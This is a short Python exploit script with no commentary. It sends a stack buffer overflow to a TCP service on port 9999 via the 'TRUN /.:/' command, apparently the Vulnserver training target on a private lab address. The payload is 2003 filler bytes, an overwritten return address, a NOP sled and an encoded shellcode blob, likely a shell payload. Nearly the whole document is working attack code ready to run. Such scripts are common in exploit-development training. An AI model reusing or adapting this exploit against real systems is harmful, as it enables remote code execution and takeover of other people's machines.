#!/usr/bin/python3

import sys, socket
from time import sleep

overflow =(
b"\xba\x33\x8a\xf3\x99\xdb\xd5\xd9\x74\x24\xf4\x5d\x2b\xc9"
b"\xb1\x52\x31\x55\x12\x83\xed\xfc\x03\x66\x84\x11\x6c\x74"
b"\x70\x57\x8f\x84\x81\x38\x19\x61\xb0\x78\x7d\xe2\xe3\x48"
b"\xf5\xa6\x0f\x22\x5b\x52\x9b\x46\x74\x55\x2c\xec\xa2\x58"
b"\xad\x5d\x96\xfb\x2d\x9c\xcb\xdb\x0c\x6f\x1e\x1a\x48\x92"
b"\xd3\x4e\x01\xd8\x46\x7e\x26\x94\x5a\xf5\x74\x38\xdb\xea"
b"\xcd\x3b\xca\xbd\x46\x62\xcc\x3c\x8a\x1e\x45\x26\xcf\x1b"
b"\x1f\xdd\x3b\xd7\x9e\x37\x72\x18\x0c\x76\xba\xeb\x4c\xbf"
b"\x7d\x14\x3b\xc9\x7d\xa9\x3c\x0e\xff\x75\xc8\x94\xa7\xfe"
b"\x6a\x70\x59\xd2\xed\xf3\x55\x9f\x7a\x5b\x7a\x1e\xae\xd0"
b"\x86\xab\x51\x36\x0f\xef\x75\x92\x4b\xab\x14\x83\x31\x1a"
b"\x28\xd3\x99\xc3\x8c\x98\x34\x17\xbd\xc3\x50\xd4\x8c\xfb"
b"\xa0\x72\x86\x88\x92\xdd\x3c\x06\x9f\x96\x9a\xd1\xe0\x8c"
b"\x5b\x4d\x1f\x2f\x9c\x44\xe4\x7b\xcc\xfe\xcd\x03\x87\xfe"
b"\xf2\xd1\x08\xae\x5c\x8a\xe8\x1e\x1d\x7a\x81\x74\x92\xa5"
b"\xb1\x77\x78\xce\x58\x82\xeb\x31\x34\x65\x59\xd9\x47\x75"
b"\x8f\x46\xc1\x93\xc5\x66\x87\x0c\x72\x1e\x82\xc6\xe3\xdf"
b"\x18\xa3\x24\x6b\xaf\x54\xea\x9c\xda\x46\x9b\x6c\x91\x34"
b"\x0a\x72\x0f\x50\xd0\xe1\xd4\xa0\x9f\x19\x43\xf7\xc8\xec"
b"\x9a\x9d\xe4\x57\x35\x83\xf4\x0e\x7e\x07\x23\xf3\x81\x86"
b"\xa6\x4f\xa6\x98\x7e\x4f\xe2\xcc\x2e\x06\xbc\xba\x88\xf0"
b"\x0e\x14\x43\xae\xd8\xf0\x12\x9c\xda\x86\x1a\xc9\xac\x66"
b"\xaa\xa4\xe8\x99\x03\x21\xfd\xe2\x79\xd1\x02\x39\x3a\xf1"
b"\xe0\xeb\x37\x9a\xbc\x7e\xfa\xc7\x3e\x55\x39\xfe\xbc\x5f"
b"\xc2\x05\xdc\x2a\xc7\x42\x5a\xc7\xb5\xdb\x0f\xe7\x6a\xdb"
b"\x05") 

shellcode = b"A"*2003 + b"\xaf\x11\x50\x62" + b"\x90" * 32 +overflow 

try:
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.connect(('192.168.233.185',9999))

	payload = b"TRUN /.:/" + shellcode

	s.send(payload)
	s.close()

except:
	print ("Error on connection to server")
	sys.exit()
